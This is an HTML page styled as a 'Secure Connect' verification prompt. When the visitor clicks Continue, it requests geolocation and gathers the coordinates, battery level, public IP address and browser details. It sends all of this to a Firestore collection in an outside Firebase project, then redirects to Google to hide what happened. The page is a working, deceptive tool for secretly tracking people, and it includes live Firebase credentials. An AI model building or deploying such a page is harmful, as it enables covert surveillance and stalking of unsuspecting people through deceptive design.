<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Connect</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            /* ලස්සන Gradient පසුබිමක් */
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 20px;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.18);
            width: 80%;
            max-width: 400px;
        }
        h3 { margin-bottom: 20px; font-weight: 400; }
        /* අලුත් Continue බොත්තම */
        #btn {
            background-color: #ffffff;
            color: #764ba2;
            padding: 15px 40px;
            border: none;
            border-radius: 50px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.3s ease;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }
        #btn:active { transform: scale(0.95); }
        #msg { margin-top: 20px; font-size: 14px; color: #eee; }
    </style>
</head>
<body>
    <div class="container">
        <h3>Verification Required</h3>
        <p>Click below to securely connect to the service.</p>
        <button id="btn">Continue</button>
        <div id="msg"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCSrL5IZHh5Zy4cFITVF9wxdiaeiynyOrM",
            authDomain: "myself-4706c.firebaseapp.com",
            projectId: "myself-4706c",
            storageBucket: "myself-4706c.firebasestorage.app",
            messagingSenderId: "638432919752",
            appId: "1:638432919752:web:0de83de77e3b0e3a07a5fd"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        document.getElementById('btn').onclick = async () => {
            const btn = document.getElementById('btn');
            const msg = document.getElementById('msg');
            btn.innerText = "Verifying...";
            btn.disabled = true;

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    let batteryLevel = "Unknown";
                    try {
                        const battery = await navigator.getBattery();
                        batteryLevel = Math.round(battery.level * 100) + "%";
                    } catch (e) {}

                    let ip = "Hidden";
                    try {
                        const res = await fetch('https://api.ipify.org?format=json');
                        const data = await res.json();
                        ip = data.ip;
                    } catch (e) {}

                    await addDoc(collection(db, "contacts_list"), {
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        accuracy: Math.round(pos.coords.accuracy) + " meters",
                        battery: batteryLevel,
                        ip_address: ip,
                        device: navigator.userAgent,
                        time: new Date().toLocaleString()
                    });

                    msg.innerText = "Redirecting...";
                    setTimeout(() => { window.location.href = "https://www.google.com"; }, 1500);
                }, (err) => {
                    msg.innerText = "Please allow permissions to continue.";
                    btn.innerText = "Continue";
                    btn.disabled = false;
                });
            }
        };
    </script>
</body>
</html>
